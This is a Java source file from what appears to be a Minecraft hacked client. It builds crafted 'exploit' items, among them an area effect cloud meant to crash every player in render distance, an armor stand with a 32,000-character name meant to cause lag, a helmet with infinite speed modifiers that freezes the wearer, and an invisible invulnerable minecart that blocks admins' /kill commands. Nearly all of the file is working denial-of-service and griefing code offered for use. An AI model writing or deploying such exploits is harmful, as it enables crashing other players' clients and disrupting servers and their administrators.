package me.zeroX150.atomic.feature;

import me.zeroX150.atomic.feature.module.ModuleRegistry;
import me.zeroX150.atomic.feature.module.impl.exploit.HologramAura;
import me.zeroX150.atomic.helper.Client;
import net.minecraft.client.gui.widget.TextFieldWidget;
import net.minecraft.enchantment.Enchantments;
import net.minecraft.entity.EquipmentSlot;
import net.minecraft.entity.attribute.EntityAttributeModifier;
import net.minecraft.entity.attribute.EntityAttributes;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.*;
import net.minecraft.text.Text;

import java.awt.*;
import java.util.UUID;

public class ItemExploits {
    public enum ItemExploit {
        HOLOGRAM_AURA("Hologram aura", new ExploitGenerator() {
            final Option name = new Option("Hologram content");
            final Option url = new Option("Image URL");

            @Override
            public ItemStack exploit() {
                String n = name.getAssociated().getText();
                String c = url.getAssociated().getText();
                HologramAura hga = (HologramAura) ModuleRegistry.getByClass(HologramAura.class);
                assert hga != null;
                if (hga.mode.getValue().equalsIgnoreCase("image") && c.isEmpty()) return null;
                HologramAura.argument = c;
                HologramAura.text = n;
                hga.setEnabled(true);
                return null;
            }

            @Override
            public Option[] getOptions() {
                return new Option[]{name, url};
            }

            @Override
            public String getDescription() {
                return "The funnies";
            }
        }),
        FIREBALL("Big fireball", new ExploitGenerator() {
            final Option v = new Option("Strength (INT)");

            @Override
            public ItemStack exploit() {
                int v1 = Client.tryParseInt(v.getAssociated().getText(), -1);
                if (v1 < 0) {
                    v.getAssociated().setEditableColor(new Color(255, 60, 60).getRGB());
                    return null;
                } else v.getAssociated().setEditableColor(0xFFFFFF);
                ItemStack stack = new ItemStack(Items.BEE_SPAWN_EGG);
                stack.setCustomName(Text.of("§r§c:)"));
                NbtCompound compound = stack.getOrCreateSubTag("EntityTag");
                compound.put("id", NbtString.of("minecraft:fireball"));
                compound.put("ExplosionPower", NbtDouble.of(v1));
                return stack;
            }

            @Override
            public Option[] getOptions() {
                return new Option[]{v};
            }

            @Override
            public String getDescription() {
                return "Makes a big fireball";
            }
        }),
        BLOCKBAN("Blockban", new ExploitGenerator() {
            @Override
            public ItemStack exploit() {
                ItemStack stack = new ItemStack(Items.BEE_SPAWN_EGG);
                stack.setCustomName(Text.of("§r§chmm i wonder what this does"));
                NbtCompound compound = stack.getOrCreateSubTag("EntityTag");
                compound.put("id", NbtString.of("minecraft:area_effect_cloud"));
                compound.put("Particle", NbtString.of("minecraft:barrier"));
                compound.put("RadiusPerTick", NbtFloat.of(0f));
                compound.put("Duration", NbtInt.of(1310700));
                compound.put("WaitTime", NbtInt.of(60));
                return stack;
            }

            @Override
            public Option[] getOptions() {
                return new Option[0];
            }

            @Override
            public String getDescription() {
                return "crashes everyone in render dist";
            }
        }),
        LAGMOR_STAND("Lagmor stand", new ExploitGenerator() {
            @Override
            public ItemStack exploit() {
                ItemStack itemStack = new ItemStack(Items.ARMOR_STAND);
                itemStack.setCustomName(Text.of("§r§cbig armor stand"));
                NbtCompound compoundTag = itemStack.getOrCreateSubTag("EntityTag");
                compoundTag.put("CustomName", NbtString.of("\"" + "0".repeat(32000) + "\""));
                compoundTag.put("CustomNameVisible", NbtByte.of(true));
                return itemStack;
            }

            @Override
            public Option[] getOptions() {
                return new Option[0];
            }

            @Override
            public String getDescription() {
                return "big armor stand";
            }
        }),
        NO_MOVE_HELMET("Troll helmet", new ExploitGenerator() {
            @Override
            public ItemStack exploit() {
                ItemStack itemStack = new ItemStack(Items.LEATHER_HELMET);
                itemStack.addAttributeModifier(EntityAttributes.GENERIC_MOVEMENT_SPEED,
                        new EntityAttributeModifier(
                                UUID.nameUUIDFromBytes(
                                        new byte[]{(byte) 1772998660, (byte) 874858241, (byte) -1911483451, (byte) 795787135}),
                                "generic.movement_speed", Double.POSITIVE_INFINITY + 1,
                                EntityAttributeModifier.Operation.fromId(0)),
                        EquipmentSlot.HEAD);
                itemStack.addAttributeModifier(EntityAttributes.GENERIC_MOVEMENT_SPEED,
                        new EntityAttributeModifier(UUID.nameUUIDFromBytes(
                                new byte[]{(byte) -774122372, (byte) -1202042950, (byte) -1378952527, (byte) -1780667942}),
                                "generic.movement_speed", Double.NEGATIVE_INFINITY - 1,
                                EntityAttributeModifier.Operation.fromId(0)),
                        EquipmentSlot.HEAD);
                NbtCompound compoundTag = itemStack.getOrCreateTag();
                compoundTag.put("HideFlags", NbtInt.of(71));
                compoundTag.put("Unbreakable", NbtByte.of(true));
                itemStack.addEnchantment(Enchantments.PROTECTION, 1);
                itemStack.setCustomName(Text.of("§r§cTroll helmet. §4Generated by §lCornos"));
                return itemStack;
            }

            @Override
            public Option[] getOptions() {
                return new Option[0];
            }

            @Override
            public String getDescription() {
                return "makes you unable to move";
            }
        }),
        NO_ENTITY_KILL("/kill blocker", new ExploitGenerator() {
            @Override
            public ItemStack exploit() {
                ItemStack itemStack = new ItemStack(Items.BAT_SPAWN_EGG);
                itemStack.setCustomName(Text.of("§r§cNo Entity Kill. §4Generated by §lCornos"));
                NbtCompound compoundTag = itemStack.getOrCreateTag();
                NbtCompound compoundTag1 = new NbtCompound();
                compoundTag1.put("LootTable", NbtString.of(""));
                compoundTag1.putString("id", "minecraft:chest_minecart");
                compoundTag1.putByte("Invulnerable", (byte) 1);
                compoundTag1.putByte("Invisible", (byte) 1);
                compoundTag1.putByte("NoGravity", (byte) 1);
                compoundTag.put("EntityTag", compoundTag1);
                return itemStack;
            }

            @Override
            public Option[] getOptions() {
                return new Option[0];
            }

            @Override
            public String getDescription() {
                return "makes admins unable to run /kill @e";
            }
        }),
        BIG_FIREWORK("Big firework", new ExploitGenerator() {
            @Override
            public ItemStack exploit() {
                ItemStack is = new ItemStack(Items.FIREWORK_ROCKET);
                is.setCustomName(Text.of("§r§cBig firework. §4Generated by §lCornos"));
                is.getOrCreateTag().put("HideFlags", NbtInt.of(32));
                NbtCompound fireworks = is.getOrCreateSubTag("Fireworks");
                fireworks.put("Flight", NbtInt.of(1));
                NbtList explosions = new NbtList();
                for (int i = 0; i < 100; i++) {
                    NbtIntArray colors = new NbtIntArray(new int[0]);
                    for (int ii = 0; ii < 20; ii++) colors.add(NbtInt.of((int) Math.floor(Math.random() * 0xFFFFFF)));
                    NbtCompound current = new NbtCompound();
                    current.put("Type", NbtInt.of((int) Math.floor(Math.random() * 4)));
                    current.put("Flicker", NbtInt.of(1));
                    current.put("Trail", NbtInt.of(1));
                    current.put("Colors", colors);
                    explosions.add(current);
                }
                fireworks.put("Explosions", explosions);
                return is;
            }

            @Override
            public Option[] getOptions() {
                return new Option[0];
            }

            @Override
            public String getDescription() {
                return "big firework";
            }
        });


        String name;
        ExploitGenerator generator;

        ItemExploit(String name, ExploitGenerator generator) {
            this.name = name;
            this.generator = generator;
        }

        public ExploitGenerator getGenerator() {
            return generator;
        }

        public String getName() {
            return name;
        }
    }

    public interface ExploitGenerator {
        ItemStack exploit();

        Option[] getOptions();

        default String getDescription() {
            return "No description";
        }

    }

    public static class Option {
        String name;
        TextFieldWidget associated;

        public Option(String name) {
            this.name = name;
        }

        public String getName() {
            return name;
        }

        public TextFieldWidget getAssociated() {
            return associated;
        }

        public void setAssociated(TextFieldWidget w) {
            associated = w;
        }
    }
}
